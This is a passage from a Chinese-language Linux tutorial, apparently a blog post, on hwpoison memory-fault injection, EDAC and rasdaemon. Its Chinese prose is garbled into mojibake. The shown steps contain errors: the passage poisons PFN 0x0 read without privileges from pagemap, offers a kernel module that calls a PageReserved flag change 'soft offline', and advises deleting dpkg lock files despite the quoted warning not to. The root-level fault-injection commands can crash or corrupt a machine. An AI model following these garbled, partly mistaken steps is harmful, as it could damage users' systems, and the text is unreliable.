} else { printf(\u0026#34;Memory poisoning triggered at address %p\\n\u0026#34;, addr); } } int main() { void *addr; addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (addr == MAP_FAILED) { perror(\u0026#34;mmap\u0026#34;); return 1; } printf(\u0026#34;Allocated memory at address %p\\n\u0026#34;, addr); // Fill the allocated memory with some data memset(addr, 0xAA, PAGE_SIZE); // Trigger memory poisoning trigger_hwpoison(addr); // Access the poisoned memory to cause a fault printf(\u0026#34;Accessing poisoned memory at address %p\\n\u0026#34;, addr); *((char *)addr) = 0xBB; // Cleanup munmap(addr, PAGE_SIZE); return 0; } 3ã€ç¼–å†™å’Œè¿è¡Œ C ç¨‹åºè·å–ç‰©ç†é¡µæ¡†å·ï¼Œå†ä½¿ç”¨å‘½ä»¤æ³¨å…¥å†…å­˜é”™è¯¯\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define PAGE_SHIFT 12 #define PAGE_SIZE (1UL \u0026lt;\u0026lt; PAGE_SHIFT) int main() { unsigned long virt_addr = 0; unsigned long page_addr; unsigned long page_offset; unsigned long *ptr; int fd; uint64_t page_entry; ptr = malloc(PAGE_SIZE); if (!ptr) { perror(\u0026#34;malloc\u0026#34;); return 1; } virt_addr = (unsigned long)ptr; fd = open(\u0026#34;/proc/self/pagemap\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (lseek(fd, (virt_addr \u0026gt;\u0026gt; PAGE_SHIFT) * sizeof(uint64_t), SEEK_SET) \u0026lt; 0) { perror(\u0026#34;lseek\u0026#34;); return 1; } if (read(fd, \u0026amp;page_entry, sizeof(uint64_t)) \u0026lt; 0) { perror(\u0026#34;read\u0026#34;); return 1; } close(fd); if (!(page_entry \u0026amp; (1ULL \u0026lt;\u0026lt; 63))) { fprintf(stderr, \u0026#34;Page not present\\n\u0026#34;); return 1; } page_addr = (page_entry \u0026amp; ((1ULL \u0026lt;\u0026lt; 55) - 1)) \u0026lt;\u0026lt; PAGE_SHIFT; page_offset = virt_addr \u0026amp; (PAGE_SIZE - 1); unsigned long pfn = page_addr \u0026gt;\u0026gt; PAGE_SHIFT; printf(\u0026#34;Virtual address: 0x%lx\\n\u0026#34;, virt_addr); printf(\u0026#34;Physical page frame number: 0x%lx\\n\u0026#34;, pfn); free(ptr); return 0; } ç¼–è¯‘å¹¶è¿è¡Œè¯¥ç¨‹åºï¼š\ngcc -o get_pfn get_pfn.c ./get_pfn è¯¥ç¨‹åºå°†è¾“å‡ºè™šæ‹Ÿåœ°å€å’Œç‰©ç†é¡µæ¡†å·:\nVirtual address: 0x55556e3ac2a0 Physical page frame number: 0x0 ä½¿ç”¨è·å–åˆ°çš„ç‰©ç†é¡µæ¡†å·æ³¨å…¥å†…å­˜é”™è¯¯ï¼š\nhacker@ubuntu:~/Desktop$ echo 0x0 | sudo tee /sys/kernel/debug/hwpoison/corrupt-pfn 0x0 tee: /sys/kernel/debug/hwpoison/corrupt-pfn: Memory page has hardware error 4ã€ç›´æ¥ä½¿ç”¨å‘½ä»¤æ³¨å…¥\n# å°†ç‰©ç†åœ°å€è½¬æ¢ä¸ºé¡µå¸§å· (PFN) physical_address=0x12345678 pfn=$(($physical_address \u0026gt;\u0026gt; 12)) # æ³¨å…¥ hwpoison echo $pfn | sudo tee /sys/kernel/debug/hwpoison/corrupt-pfn éªŒè¯å†…å­˜æ¯’åŒ–åŠŸèƒ½ æ£€æŸ¥å†…æ ¸æ—¥å¿—ä»¥ç¡®è®¤å†…å­˜é”™è¯¯å·²è¢«æ£€æµ‹å’Œå¤„ç†ï¼š\n[ 2481.576496] Injecting memory failure at pfn 0x0 [ 2481.576516] Memory failure: 0x0: already hardware poisoned [ 2392.437856] Injecting memory failure at pfn 0x12345 [ 2392.439018] Memory failure: 0x12345: recovery action for clean LRU page: Recovered æ€»çš„æ¥è¯´ï¼Œhwpoison æ˜¯ä¸€ä¸ªç”¨äºæé«˜ç³»ç»Ÿç¨³å®šæ€§å’Œå¯é æ€§çš„å…³é”®æœºåˆ¶ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦å¤„ç†ç¡¬ä»¶å†…å­˜é”™è¯¯çš„ç¯å¢ƒä¸­ã€‚\næ¢å¤å†…å­˜æ¯’åŒ–é¡µé¢ 1ã€ä½¿ç”¨ echoå†™å…¥ /sys/kernel/debug/hwpoison/unpoison-pfn\nåœ¨PFNçš„Software-unpoisoné¡µé¢å¯¹åº”åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ï¼Œä¸€ä¸ªé¡µé¢å¯ä»¥å†æ¬¡è¢«å¤ç”¨ã€‚è¿™åªå¯¹Linuxæ³¨å…¥çš„æ•…éšœèµ·ä½œç”¨ï¼Œå¯¹çœŸæ­£çš„å†…å­˜æ•…éšœä¸èµ·ä½œç”¨ã€‚ echo 0x12345 \u0026gt; /sys/kernel/mm/page_poison/unpoison-pfn 2ã€ä½¿ç”¨madviceç³»ç»Ÿè°ƒç”¨\nmadvise ç³»ç»Ÿè°ƒç”¨å¯ç”¨äºé€šçŸ¥å†…æ ¸æŸäº›å†…å­˜é¡µé¢çš„æœŸæœ›ä½¿ç”¨æ–¹å¼ï¼Œä½†ä¸èƒ½ç›´æ¥è§£é™¤ hwpoison çŠ¶æ€ã€‚ç„¶è€Œï¼Œç»“åˆ madvise å’Œé‡å¯ç³»ç»Ÿï¼Œå¯ä»¥é—´æ¥å¸®åŠ©æ¢å¤å†…å­˜çŠ¶æ€ã€‚ 3ã€æˆ–è€…é€šè¿‡å†…æ ¸æ¨¡å—æ¢å¤æ¯’åŒ–çš„å†…å­˜é¡µ\n#include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; #include \u0026lt;linux/page-flags.h\u0026gt; static unsigned long pfn = 0; module_param(pfn, ulong, 0); MODULE_PARM_DESC(pfn, \u0026#34;Page Frame Number to be unpoisoned\u0026#34;); static int __init unpoison_page_init(void) { struct page *page; if (pfn == 0) { pr_err(\u0026#34;Invalid PFN\\n\u0026#34;); return -EINVAL; } page = pfn_to_page(pfn); if (!page) { pr_err(\u0026#34;Invalid page\\n\u0026#34;); return -EINVAL; } pr_info(\u0026#34;Unpoisoning page at PFN: 0x%lx\\n\u0026#34;, pfn); ClearPageHWPoison(page); return 0; } static void __exit unpoison_page_exit(void) { pr_info(\u0026#34;unpoison_page module exited\\n\u0026#34;); } module_init(unpoison_page_init); module_exit(unpoison_page_exit); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;Your Name\u0026#34;); MODULE_DESCRIPTION(\u0026#34;A simple module to unpoison a memory page\u0026#34;); ç¼–è¯‘å’ŒåŠ è½½å†…æ ¸æ¨¡å—\nä¿å­˜ä»£ç ä¸º unpoison_page.cã€‚\nåˆ›å»ºä¸€ä¸ª Makefileï¼š\nobj-m += unpoison_page.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean ç¼–è¯‘å†…æ ¸æ¨¡å—\nmake åŠ è½½å†…æ ¸æ¨¡å—ï¼Œå¹¶ä¼ é€’éœ€è¦æ¢å¤çš„ PFNï¼ˆä»ä¹‹å‰è·å–çš„ PFNï¼‰ï¼š\nsudo insmod unpoison_page.ko pfn=0x12345 éªŒè¯å†…æ ¸æ—¥å¿—\né€šè¿‡ dmesg å‘½ä»¤æŸ¥çœ‹å†…æ ¸æ—¥å¿—ï¼Œç¡®è®¤å†…å­˜é¡µæ˜¯å¦å·²æ¢å¤ï¼š\ndmesg | grep poison [ 1234.567890] Unpoisoning page at PFN: 0x12345 EDAC EDAC (Error Detection and Correction) æ˜¯ä¸€ç§ç¡¬ä»¶å’Œè½¯ä»¶ç»“åˆçš„æŠ€æœ¯ï¼Œç”¨äºæ£€æµ‹å’Œçº æ­£è®¡ç®—æœºå†…å­˜ä¸­çš„é”™è¯¯ã€‚å®ƒç‰¹åˆ«é€‚ç”¨äºæœåŠ¡å™¨å’Œå…¶ä»–é«˜å¯é æ€§è®¡ç®—ç¯å¢ƒã€‚EDAC é€šè¿‡æ£€æµ‹å†…å­˜ä¸­çš„é”™è¯¯å¹¶åœ¨å¯èƒ½çš„æƒ…å†µä¸‹è‡ªåŠ¨çº æ­£è¿™äº›é”™è¯¯ï¼Œå¸®åŠ©ç¡®ä¿ç³»ç»Ÿç¨³å®šæ€§å’Œæ•°æ®å®Œæ•´æ€§ã€‚\nEDAC çš„ä¸»è¦åŠŸèƒ½ é”™è¯¯æ£€æµ‹ï¼š EDAC èƒ½å¤Ÿæ£€æµ‹å†…å­˜ä¸­çš„é”™è¯¯ï¼Œä¾‹å¦‚å•æ¯”ç‰¹é”™è¯¯ï¼ˆSingle-Bit Errorsï¼ŒSBEï¼‰å’Œå¤šæ¯”ç‰¹é”™è¯¯ï¼ˆMulti-Bit Errorsï¼ŒMBEï¼‰ã€‚ é”™è¯¯çº æ­£ï¼š å¯¹äºå•æ¯”ç‰¹é”™è¯¯ï¼ŒEDAC é€šå¸¸èƒ½å¤Ÿè‡ªåŠ¨çº æ­£ã€‚ å¯¹äºå¤šæ¯”ç‰¹é”™è¯¯ï¼ŒEDAC ä¼šè®°å½•é”™è¯¯å¹¶å‘å‡ºè­¦å‘Šï¼Œæé†’ç®¡ç†å‘˜é‡‡å–è¿›ä¸€æ­¥è¡ŒåŠ¨ã€‚ é”™è¯¯æŠ¥å‘Šï¼š EDAC ä¼šè®°å½•å¹¶æŠ¥å‘Šæ£€æµ‹åˆ°çš„å†…å­˜é”™è¯¯ï¼Œæä¾›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬é”™è¯¯ç±»å‹ã€å‘ç”Ÿæ—¶é—´å’Œä½ç½®ç­‰ã€‚ ç¡¬ä»¶æ”¯æŒï¼šä¾èµ–äºç¡¬ä»¶ï¼Œé€šå¸¸éœ€è¦æ”¯æŒECCï¼ˆError Correction Codeï¼‰å†…å­˜æˆ–å…¶ä»–ç±»å‹çš„é”™è¯¯æ£€æµ‹å’Œçº æ­£æœºåˆ¶ã€‚ EDAC-utilçš„ä½¿ç”¨(EDAC-utilså·²ç»è¢«å¼ƒç”¨) 1ã€ç¡®è®¤ç³»ç»Ÿæ”¯æŒ EDACï¼š\nç¡®ä¿ä½ çš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿæ”¯æŒ EDACã€‚ç°ä»£çš„æœåŠ¡å™¨å’Œä¸€äº›é«˜ç«¯å·¥ä½œç«™é€šå¸¸æ”¯æŒ ECCï¼ˆError-Correcting Codeï¼‰å†…å­˜ï¼Œè¿™æ˜¯ EDAC åŠŸèƒ½çš„åŸºç¡€ï¼Œä¸‹é¢æ£€æµ‹ç”µè„‘æ˜¯å¦æ”¯æŒECCå†…å­˜ root@ecs-c7f5:~# dmidecode -t memory # dmidecode 3.4 Getting SMBIOS data from sysfs. SMBIOS 2.8 present. Handle 0x1000, DMI type 16, 23 bytes Physical Memory Array Location: Other Use: System Memory Error Correction Type: Multi-bit ECC Maximum Capacity: 16 GB Error Information Handle: Not Provided Number Of Devices: 1 æŸ¥è¯¢ç³»ç»Ÿæ‰€æ”¯æŒçš„EDACæ¨¡å—ï¼Œé€‰æ‹©ä¸æœºå™¨ç¡¬ä»¶æ‰€é€‚é…çš„EDACæ¨¡å—å®‰è£…ã€‚ hacker@ubuntu:~/Desktop$ ls /lib/modules/{å¯¹åº”çš„å†…æ ¸ç‰ˆæœ¬}/kernel/drivers/edac/ amd64_edac.ko i3000_edac.ko i5400_edac.ko ie31200_edac.ko skx_edac.ko e752x_edac.ko i3200_edac.ko i7300_edac.ko igen6_edac.ko x38_edac.ko edac_mce_amd.ko i5000_edac.ko i7core_edac.ko pnd2_edac.ko i10nm_edac.ko i5100_edac.ko i82975x_edac.ko sb_edac.ko 2ã€åŠ è½½EDACæ¨¡å—ï¼š\nåœ¨ç°ä»£çš„Linuxå†…æ ¸ä¸­ï¼ŒEDACæ¨¡å—é€šå¸¸å·²ç»åŒ…å«åœ¨å†…æ ¸ä¸­ã€‚ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤åŠ è½½ç›¸åº”çš„æ¨¡å—ï¼š\nsudo modprobe i7core_edac 3ã€å®‰è£…å’Œé…ç½® EDAC å·¥å…·ï¼š\nåœ¨ Linux ç³»ç»Ÿä¸Šï¼Œå¯ä»¥ä½¿ç”¨ edac-utils æ¥ç®¡ç†å’Œç›‘æ§ EDACã€‚å®‰è£…æ–¹æ³•å¦‚ä¸‹\nsudo apt-get install edac-utils 4ã€æ£€æŸ¥ EDAC çŠ¶æ€ï¼š\nä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ EDAC çŠ¶æ€ï¼š\nsudo edac-util --status 5ã€æ¨¡æ‹Ÿå†…å­˜é”™è¯¯ï¼š\nåœ¨æ²¡æœ‰å®é™…ç¡¬ä»¶æ”¯æŒçš„æƒ…å†µä¸‹ï¼Œæ¨¡æ‹Ÿå†…å­˜é”™è¯¯æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å†…æ ¸å‚æ•°æˆ–ä½¿ç”¨ä¸€äº›ä¸“é—¨çš„å·¥å…·æ¥æ¨¡æ‹Ÿå†…å­˜é”™è¯¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯èƒ½çš„æ–¹æ³•ï¼š é€šè¿‡å†…æ ¸è°ƒè¯•åŠŸèƒ½ï¼š æœ‰äº›ç³»ç»Ÿå…è®¸é€šè¿‡å†…æ ¸è°ƒè¯•åŠŸèƒ½æ¥æ’å…¥å†…å­˜é”™è¯¯ã€‚è¿™é€šå¸¸éœ€è¦ç¼–å†™å†…æ ¸æ¨¡å—æˆ–è€…ä½¿ç”¨ä¸€äº›å†…æ ¸è°ƒè¯•å·¥å…·ã€‚ ä½¿ç”¨å†…å­˜æµ‹è¯•å·¥å…·ï¼š åƒ memtest86+ è¿™æ ·çš„å·¥å…·å¯ä»¥ç”¨äºæµ‹è¯•å†…å­˜æ˜¯å¦å­˜åœ¨é”™è¯¯ï¼Œä½†å®ƒä»¬é€šå¸¸ä¸ä¼šä¸»åŠ¨æ¨¡æ‹Ÿé”™è¯¯ã€‚ 6ã€éªŒè¯ EDAC çš„å·¥ä½œï¼š\nåœ¨æ¨¡æ‹Ÿå†…å­˜é”™è¯¯åï¼Œå¯ä»¥é€šè¿‡ dmesg å‘½ä»¤æŸ¥çœ‹å†…æ ¸æ—¥å¿—ï¼Œç¡®è®¤ EDAC æ˜¯å¦æ£€æµ‹åˆ°é”™è¯¯å¹¶è¿›è¡Œçº æ­£ã€‚ä¾‹å¦‚ï¼š\ndmesg | grep -i edac Rasdaemon(ç›®å‰ä¸»æµçš„æ£€é”™çº é”™å·¥å…·) Rasdaemon (Reliability, Availability, and Serviceability daemon) æ˜¯ä¸€ä¸ªå¼€æºçš„ç³»ç»ŸæœåŠ¡ï¼Œç”¨äºæ•è·å’ŒæŠ¥å‘Šç¡¬ä»¶é”™è¯¯äº‹ä»¶ï¼Œç‰¹åˆ«æ˜¯ä¸å†…å­˜ã€å¤„ç†å™¨å’Œå…¶ä»–å…³é”®ç¡¬ä»¶ç›¸å…³çš„é”™è¯¯ã€‚å®ƒæ”¯æŒ Linux ç³»ç»Ÿï¼Œèƒ½å¤Ÿç›‘æ§å’Œè®°å½•ç¡¬ä»¶é”™è¯¯ï¼Œæä¾›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼Œæœ‰åŠ©äºç³»ç»Ÿç®¡ç†å‘˜è¿›è¡Œè¯Šæ–­å’Œæ•…éšœæ’é™¤ã€‚Rasdaemon åˆ©ç”¨ç¡¬ä»¶æä¾›çš„é”™è¯¯æŠ¥å‘Šæœºåˆ¶ï¼Œé€šè¿‡å†…æ ¸äº‹ä»¶è¿½è¸ª (kernel trace) ç³»ç»Ÿæ”¶é›†ç¡¬ä»¶é”™è¯¯äº‹ä»¶ã€‚\nRasdaemon çš„ä¸»è¦åŠŸèƒ½ é”™è¯¯ç›‘æ§å’ŒæŠ¥å‘Šï¼š æ•è·å’Œè®°å½•å†…å­˜é”™è¯¯ã€å¤„ç†å™¨é”™è¯¯ã€PCIe é”™è¯¯ç­‰ã€‚ æä¾›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬é”™è¯¯ç±»å‹ã€å‘ç”Ÿæ—¶é—´ã€ä½ç½®ç­‰ã€‚ ä¸ EDAC é›†æˆï¼š å…¼å®¹ EDAC (Error Detection And Correction) æ¡†æ¶ï¼Œèƒ½å¤Ÿæ•è·å†…å­˜æ§åˆ¶å™¨é”™è¯¯ã€‚ æ•°æ®æŒä¹…æ€§ï¼š å°†é”™è¯¯äº‹ä»¶æŒä¹…åŒ–å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œä¾¿äºåç»­åˆ†æã€‚ ç”¨æˆ·ç©ºé—´å·¥å…·ï¼š æä¾›ç”¨æˆ·ç©ºé—´å·¥å…·ï¼Œç”¨äºæŸ¥è¯¢å’Œåˆ†æé”™è¯¯æ•°æ®ã€‚ Rasdaemon çš„ä½¿ç”¨ï¼ˆéœ€è¦EDACæ”¯æŒï¼‰ 1ã€å®‰è£…rasdaemon\nsudo apt install rasdaemon 2ã€é…ç½®rasdaemon\nå¯åŠ¨rasdaemon root@ecs-c7f5:~# rasdaemon --enable rasdaemon: ras:mc_event event enabled rasdaemon: ras:aer_event event enabled rasdaemon: mce:mce_record event enabled rasdaemon: ras:extlog_mem_event event enabled éœ€è¦å¯åŠ¨ä¸¤ä¸ªsystemdæœåŠ¡: ras-mc-ctl.service å’Œ rasdaemon.service : root@ecs-c7f5:~# systemctl enable ras-mc-ctl.service root@ecs-c7f5:~# systemctl enable rasdaemon.service root@ecs-c7f5:~# systemctl start ras-mc-ctl.service root@ecs-c7f5:~# systemctl start rasdaemon.service Synchronizing state of rasdaemon.service with SysV service script with /lib/systemd/systemd-sysv-install. Executing: /lib/systemd/systemd-sysv-install enable rasdaemon 3ã€æ£€æŸ¥ rasdaemon çŠ¶æ€\nsystemctl status rasdaemon systemctl status ras-mc-ctl è¾“å‡ºä¿¡æ¯:\n# rasdaemon æœåŠ¡çŠ¶æ€ â— rasdaemon.service - RAS daemon to log the RAS events Loaded: loaded (/usr/lib/systemd/system/rasdaemon.service; enabled; vendor preset: disabled) Active: active (running) since Tue 2023-11-28 11:22:16 CST; 5s ago Process: 181029 ExecStartPost=/usr/sbin/rasdaemon --enable (code=exited, status=0/SUCCESS) Main PID: 181014 (rasdaemon) Memory: 8.0M CGroup: /system.slice/rasdaemon.service â””â”€181014 /usr/sbin/rasdaemon -f -r Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Enabled event ras:aer_event Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Family 6 Model 55 CPU: only decoding architectural errors Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: mce:mce_record event enabled Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Enabled event mce:mce_record Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: ras:extlog_mem_event event enabled Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Enabled event ras:extlog_mem_event Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording mc_event events Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording aer_event events Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording extlog_event events Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording mce_record events # ras-mc-ctl æœåŠ¡çŠ¶æ€ â— ras-mc-ctl.service - Initialize EDAC v3.0.0 Drivers For Machine Hardware Loaded: loaded (/lib/systemd/system/ras-mc-ctl.service; enabled; vendor preset: enabled) Active: active (exited) since Tue 2023-11-28 11:31:22 CST; 9min ago Main PID: 2772415 (code=exited, status=0/SUCCESS) CPU: 53ms Nov 28 11:31:22 zcloud.staging.huatai.me systemd[1]: Starting Initialize EDAC v3.0.0 Drivers For Machine Hardware... Nov 28 11:31:22 zcloud.staging.huatai.me ras-mc-ctl[2772415]: ras-mc-ctl: Error: No dimm labels for HP model ProLiant DL360 Gen9 Nov 28 11:31:22 zcloud.staging.huatai.me systemd[1]: Finished Initialize EDAC v3.0.0 Drivers For Machine Hardware. è¿™é‡Œæœ‰ä¸€ä¸ªé”™è¯¯æç¤º: ras-mc-ctl: Error: No dimm labels for XXXX ï¼Œå®é™…ä¸Šåœ¨å„ç§æœåŠ¡å™¨ä¸Šåˆå§‹æ—¶éƒ½èƒ½çœ‹åˆ°ï¼Œéœ€è¦è¿›ä¸€æ­¥é…ç½®ã€‚\n4ã€æ£€æŸ¥EDACä¿¡æ¯ï¼ˆå¦‚æœä½¿ç”¨ECCå†…å­˜ï¼‰ï¼š å¯ä»¥ä½¿ç”¨ras-mc-ctlå·¥å…·ï¼ˆé€šå¸¸åŒ…å«åœ¨rasdaemonåŒ…ä¸­ï¼‰æ¥æ£€æŸ¥è¯¦ç»†çš„EDACä¿¡æ¯ï¼š\nsudo ras-mc-ctl --status ras-mc-ctl --layout 5ã€ä½¿ç”¨rasdaemon\nåœ¨åå°è¿è¡Œrasdaemonï¼Œç›´æ¥è¾“å…¥rasdaemonå°±è¡Œã€‚ rasdaemon åœ¨å‰å°è¿è¡Œrasdaemonï¼Œæ­¤æ—¶è¾“å‡ºæ˜¾ç¤º rasdaemon åˆå§‹åŒ–å¹¶ç›‘å¬äº‹ä»¶ï¼Œæ­¤æ—¶å°±å¯ä»¥ç­‰å¾…å‡ºç°çš„ç¡¬ä»¶å¼‚å¸¸ã€‚ rasdaemon -f å¦‚æœå¸Œæœ›åŒæ—¶å°†é”™è¯¯è®°å½•åˆ°æ•°æ®åº“(ç¼–è¯‘æ—¶ä½¿ç”¨äº†å‚æ•° --enable-sqlite3)ï¼Œåˆ™å¯ä»¥å¢åŠ ä¸€ä¸ª -r å‚æ•°:\nrasdaemon -f -r é…ç½® DIMM labels\nras-mc-ctl æ˜¯RASå†…å­˜æ§åˆ¶å™¨ç®¡ç†å·¥å…·ï¼Œç”¨äºæ‰§è¡Œä¸€äº›é’ˆå¯¹EDAC(Error Detection and Correction)é©±åŠ¨çš„RASç®¡ç†ä»»åŠ¡ã€‚\nras-mc-ctl å¯ä»¥æŸ¥è¯¢æ£€æµ‹åˆ°çš„é”™è¯¯ï¼Œä¾‹å¦‚ --error-count å¯ä»¥è·å–ä¸»æœºé”™è¯¯è®¡æ•°:\nras-mc-ctl ä½¿ç”¨ --error-count è·å–é”™è¯¯è®¡æ•°\n# ras-mc-ctl --error-count Label CE UE mc#0csrow#2channel#0 0 0 mc#0csrow#2channel#1 0 0 mc#0csrow#3channel#1 0 0 mc#0csrow#3channel#0 0 0 ä½¿ç”¨ ras-mc-ctl æ‰“å°å‡ºè¢«è®°å½•çš„æ‰€æœ‰é”™è¯¯ã€‚\n# ras-mc-ctl --summary Memory controller events summary: Corrected on DIMM Label(s): \u0026#39;DIMM_B1\u0026#39; location: 0:2:0:-1 errors: 5 PCIe AER events summary: 1 Uncorrected (Non-Fatal) errors: BIT21 No Extlog errors. No devlink errors. Disk errors summary: 0:0 has 6646 errors No MCE errors. åˆ©ç”¨Rasdaemonå®ç°é”™è¯¯å†…å­˜çš„è½¯ä¸‹çº¿ ç”±äºç¼ºä¹eccå†…å­˜ï¼Œå¯¼è‡´edacæ¨¡å—æ— æ³•æ­£å¸¸è¿è¡Œï¼Œæ‰€ä»¥rasdaemonä¹Ÿæ— æ³•æ­£å¸¸æ•è·åˆ°é”™è¯¯ï¼Œå› æ­¤æˆ‘ä»¬åªåšäº†å¯¹æŒ‡å®šé¡µé¢çš„è½¯ä¸‹çº¿ã€‚\nä½¿ç”¨ Rasdaemon ç›‘æ§å’Œå¤„ç†é”™è¯¯\nRasdaemon ä¼šè‡ªåŠ¨ç›‘æ§å’Œè®°å½•å†…å­˜é”™è¯¯ï¼Œå¹¶åœ¨æ£€æµ‹åˆ°å†…å­˜é”™è¯¯æ—¶ï¼Œå°è¯•å¯¹ç›¸å…³é¡µé¢è¿›è¡Œè½¯ä¸‹çº¿ã€‚\nsudo ras-mc-ctl --errors | grep \u0026lt;error_address\u0026gt; æ£€æŸ¥æ—¥å¿—\nä½ å¯ä»¥æŸ¥çœ‹ Rasdaemon ç”Ÿæˆçš„æ—¥å¿—ï¼Œä»¥ç¡®è®¤å†…å­˜é”™è¯¯å’Œè½¯ä¸‹çº¿äº‹ä»¶ï¼š\nsudo ras-mc-ctl --summary sudo journalctl -u rasdaemon ç¼–å†™å†…æ ¸æ¨¡å—å¯¹é¡µé¢è¿›è¡Œè½¯ä¸‹çº¿\n#include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; #include \u0026lt;linux/mmzone.h\u0026gt; #include \u0026lt;linux/pfn.h\u0026gt; static unsigned long target_pfn = 0x12345; // æ›¿æ¢ä¸ºä½ è¦ä¸‹çº¿çš„é¡µæ¡†å· static int __init soft_offline_page_init(void) { struct page *page; unsigned long flags; int ret = 0; pr_info(\u0026#34;Soft offline page at PFN %lu\\n\u0026#34;, target_pfn); page = pfn_to_page(target_pfn); if (!PageReserved(page)) { // è·å–æ‰€åœ¨çš„å†…å­˜åŒºåŸŸï¼ˆzoneï¼‰ struct zone *zone = page_zone(page); spin_lock_irqsave(\u0026amp;zone-\u0026gt;lock, flags); SetPageReserved(page); spin_unlock_irqrestore(\u0026amp;zone-\u0026gt;lock, flags); pr_info(\u0026#34;Page at PFN %lu successfully offlined\\n\u0026#34;, target_pfn); } else { pr_warn(\u0026#34;Page at PFN %lu is already reserved, cannot offline\\n\u0026#34;, target_pfn); ret = -EBUSY; } return ret; } static void __exit soft_offline_page_exit(void) { pr_info(\u0026#34;Module unloaded\\n\u0026#34;); } module_init(soft_offline_page_init); module_exit(soft_offline_page_exit); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;Lijun\u0026#34;); MODULE_DESCRIPTION(\u0026#34;Soft offline specified page frame number\u0026#34;); é—®é¢˜æ±‡æ€»ï¼š 1ã€apt install æŠ¥é”™\nhacker@ubuntu:~/Desktop$ sudo apt-get install edac-utils E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 4700 (unattended-upgr) N: Be aware that removing the lock file is not a solution and may break your system. E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it? è§£å†³æ–¹æ³•ï¼šåˆ é™¤é”å®šæ–‡ä»¶\nåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ ¹æœ¬åŸå› å¯èƒ½æ˜¯é”æ–‡ä»¶ã€‚é”æ–‡ä»¶é˜»æ­¢ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹è®¿é—®ç›¸åŒçš„æ•°æ®ã€‚å½“æ‚¨è¿è¡Œ apt æˆ– apt-get å‘½ä»¤æ—¶ï¼Œé€šå¸¸ä¼šåˆ›å»ºä¸€ä¸ªé”æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœ€æ–°çš„ apt å‘½ä»¤æ²¡æœ‰æˆåŠŸæ‰§è¡Œ(å³çªç„¶ç»ˆæ­¢)ï¼Œé”æ–‡ä»¶å°†ç»§ç»­å­˜åœ¨å¹¶é˜»æ­¢ä»»ä½•åç»­çš„ apt æˆ– apt-get å®ä¾‹ã€‚\nè§£å†³ â€œCould not get lock /var/lib/apt/lists/lockâ€é”™è¯¯\n$ sudo rm /var/lib/apt/lists/lock è§£å†³ â€œCould not get lock /var/lib/dpkg/lockâ€é”™è¯¯\n$ sudo rm /var/lib/dpkg/lock å…¶ä»–æ—¶å€™ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ° â€œ/var/lib/dpkg/lock-frontend errorâ€çš„é”™è¯¯ã€‚è¿™æ„å‘³ç€å½“å‰æ­£åœ¨è¿è¡Œä½¿ç”¨ APT / DPKG çš„å›¾å½¢åº”ç”¨ç¨‹åºï¼Œè¿™å¯èƒ½æ˜¯ä½¿ç”¨ Gdebi æˆ– Synaptic åŒ…ç®¡ç†å™¨é€ æˆçš„ã€‚\nå³æ—¶çš„è¡¥æ•‘æªæ–½æ˜¯é€€å‡ºæˆ–å…³é—­ç¨‹åºï¼Œå¹¶å†æ¬¡å°è¯•ã€‚å¦‚æœæ²¡æœ‰æ•ˆæœï¼Œå¯æ˜¯å°è¯•åˆ é™¤ /var/lib/dpkg/lock-frontend æ–‡ä»¶ã€‚\n$ sudo rm /var/lib/dpkg/lock-frontend åˆ é™¤ lock-frontend æ–‡ä»¶å¯èƒ½ä¼šå†æ¬¡å¯¼è‡´â€œCould not get lock /var/lib/dpkg/lockâ€é”™è¯¯ï¼Œå› æ­¤ï¼Œæ‚¨å°†ä¸å¾—ä¸ç»§ç»­åˆ é™¤ç›¸å…³é”å®šæ–‡ä»¶ã€‚\n$ sudo rm 